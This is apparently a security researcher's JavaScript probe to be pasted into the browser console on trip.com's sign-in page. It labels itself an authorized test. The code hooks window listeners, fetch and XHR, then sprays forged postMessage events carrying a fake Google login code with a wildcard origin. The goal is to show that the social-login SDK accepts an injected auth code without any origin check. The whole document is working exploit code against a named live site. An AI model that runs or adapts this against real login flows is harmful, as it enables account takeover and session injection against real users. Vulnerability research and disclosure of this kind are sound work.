// PASTE INTO CONSOLE OF https://www.trip.com/account/signin  (authorized test, sshabib, benign marker)
// This version: hooks the network, then you click Google; a fast 200ms sprayer catches the armed listener
// before it tears down. It ALSO reports whether a 'message' listener got registered at all.

(function () {
  const MARKER = 'STEP1_MARKER_NOT_A_REAL_CODE';
  let hit = false, armed = false;

  // --- detect listener registration ---
  const origAdd = window.addEventListener;
  window.addEventListener = function (type, fn) {
    if (type === 'message') {
      armed = true;
      console.log('%c[PROBE] a window "message" listener was just REGISTERED (SDK armed). Spraying now.', 'color:#fa0;font-weight:bold');
    }
    return origAdd.apply(this, arguments);
  };

  // --- hook fetch + XHR to catch the marker reaching the login RPC ---
  const of = window.fetch;
  window.fetch = function (url, opts) {
    try {
      const u = (typeof url === 'string') ? url : (url && url.url) || '';
      const b = opts && opts.body ? String(opts.body) : '';
      if (b.includes(MARKER)) { hit = true; console.log('%c[PASS] MARKER in fetch -> ' + u + ' | NO origin check, authCode ingested.', 'color:#0f0;font-size:16px;font-weight:bold'); console.log(b.slice(0, 600)); }
      else if (u.includes('14553') || u.includes('authenticate')) console.log('%c[note] authenticate call (not our marker): ' + u, 'color:#0af');
    } catch (e) {}
    return of.apply(this, arguments);
  };
  const oo = XMLHttpRequest.prototype.open, os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (m, u) { this.__u = u; return oo.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function (b) {
    try {
      const body = b ? String(b) : '';
      if (body.includes(MARKER)) { hit = true; console.log('%c[PASS] MARKER in XHR -> ' + this.__u + ' | NO origin check, authCode ingested.', 'color:#0f0;font-size:16px;font-weight:bold'); console.log(body.slice(0, 600)); }
      else if (this.__u && (this.__u.includes('14553') || this.__u.includes('authenticate'))) console.log('%c[note] authenticate XHR (not our marker): ' + this.__u, 'color:#0af');
    } catch (e) {}
    return os.apply(this, arguments);
  };

  // --- fast sprayer: fires the forged message every 200ms; keeps going 90s ---
  function shoot() {
    window.postMessage({ tpSignalCode: 'TRIP',  code: MARKER, type: 'google' }, '*');
    window.postMessage({ tpSignalCode: 'CTRIP', code: MARKER, type: 'google' }, '*');
    window.postMessage({ code: MARKER, message: '', context: '{}', token: MARKER, taskType: 1 }, '*');
  }
  let n = 0;
  const t = setInterval(function () {
    shoot();
    if (++n % 25 === 0) console.log('[PROBE] still spraying... armed=' + armed + ' hit=' + hit + ' (click Google now if you have not)');
    if (hit || n > 450) { clearInterval(t); console.log('%c[PROBE] finished. armed=' + armed + '  hit=' + hit, 'color:#fa0;font-weight:bold'); }
  }, 200);

  console.log('%c[PROBE] ready. NOW click the Google social-login button on this page. Watch for a green [PASS] or the "armed=true" note.', 'color:#fa0;font-size:14px;font-weight:bold');
})();
